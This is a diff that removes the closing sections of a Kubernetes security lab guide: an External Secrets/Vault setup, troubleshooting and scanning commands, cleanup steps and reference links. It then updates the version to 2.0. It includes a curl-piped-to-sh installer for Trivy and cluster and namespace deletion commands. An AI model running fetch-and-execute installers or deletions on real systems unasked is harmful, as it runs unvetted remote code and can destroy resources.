-helm repo add external-secrets https://charts.external-secrets.io
-helm repo update
-
-helm install external-secrets external-secrets/external-secrets \
-  -n external-secrets \
-  --create-namespace
-
-# Wait for operator to be ready
-kubectl wait --for=condition=Ready pods -l app.kubernetes.io/name=external-secrets -n external-secrets --timeout=120s
-
-# Create SecretStore pointing to HashiCorp Vault
-cat <<EOF | kubectl apply -f -
-apiVersion: external-secrets.io/v1beta1
-kind: SecretStore
-metadata:
-  name: vault-backend
-  namespace: pam-integration
-spec:
-  provider:
-    vault:
-      server: "http://vault.vault.svc.cluster.local:8200"
-      path: "secret"
-      version: "v2"
-      auth:
-        tokenSecretRef:
-          name: vault-token
-          key: token
-EOF
-```
-
----
-
-## Troubleshooting Commands
-
-### Kubernetes Diagnostics
-
-```bash
-# Check cluster status
-kubectl cluster-info
-kubectl get nodes -o wide
-kubectl get componentstatuses
-
-# Check all pods across namespaces
-kubectl get pods -A
-kubectl get pods -A | grep -v Running
-
-# Check events (sorted by time)
-kubectl get events --sort-by='.lastTimestamp' -A
-
-# Check resource usage
-kubectl top nodes
-kubectl top pods -A
-
-# Describe problematic pod
-kubectl describe pod <pod-name> -n <namespace>
-
-# Check pod logs
-kubectl logs <pod-name> -n <namespace>
-kubectl logs <pod-name> -n <namespace> --previous  # Previous container logs
-kubectl logs <pod-name> -n <namespace> -f  # Follow logs
-
-# Execute into pod for debugging
-kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
-
-# Check network connectivity from pod
-kubectl exec -it <pod-name> -n <namespace> -- nslookup kubernetes.default
-kubectl exec -it <pod-name> -n <namespace> -- wget -qO- http://service-name:port
-
-# Verify RBAC permissions
-kubectl auth can-i --list
-kubectl auth can-i create pods --as=system:serviceaccount:namespace:sa-name
-
-# Check API server audit logs (if enabled)
-kubectl logs -n kube-system -l component=kube-apiserver
-```
-
-### Security Scanning
-
-```bash
-# Install Trivy for container scanning
-curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
-
-# Scan container image
-trivy image nginx:latest
-trivy image --severity HIGH,CRITICAL nginx:latest
-
-# Scan Kubernetes cluster
-trivy k8s --report summary cluster
-
-# Scan specific namespace
-trivy k8s -n default --report all
-
-# Install kube-bench for CIS benchmarks
-kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
-
-# Check kube-bench results
-kubectl logs -l app=kube-bench
-```
-
----
-
-## Cleanup Commands
-
-```bash
-# Delete demo namespaces
-kubectl delete namespace rbac-demo netpol-demo pss-demo secrets-demo pam-integration --ignore-not-found
-
-# Delete kind cluster
-kind delete cluster --name pam-lab
-
-# Delete minikube cluster
-minikube delete
-
-# Stop k3s
-sudo systemctl stop k3s
-```
-
----
-
-## Related Documents
-
-- **Phase 1 Overview**: [PHASE1_MONTHS_1-11.md](../roadmap/PHASE1_MONTHS_1-6.md)
-- **CKS Certification Guide**: [CKS_CERTIFICATION_GUIDE.md](archive/CKS_CERTIFICATION_GUIDE.md)
-- **CKS Cheat Sheets**: [CKS_CHEAT_SHEETS.md](archive/CKS_CHEAT_SHEETS.md)
-- **Troubleshooting**: [TROUBLESHOOTING.md](../TROUBLESHOOTING.md)
-- **Official Resources**: [OFFICIAL_RESOURCES.md](OFFICIAL_RESOURCES.md)
-
----
-
-## External References
-
-- [Kubernetes Official Documentation](https://kubernetes.io/docs/)
-- [CKS Exam Curriculum](https://github.com/cncf/curriculum)
-- [CyberArk Documentation](https://docs.cyberark.com)
-- [HashiCorp Vault Documentation](https://developer.hashicorp.com/vault/docs)
-- [Trivy Documentation](https://aquasecurity.github.io/trivy/)
-
----
-
-**Last Updated**: 2026-04-07
-**Version**: 1.0
+**Last Updated**: 2026-04-14
+**Version**: 2.0
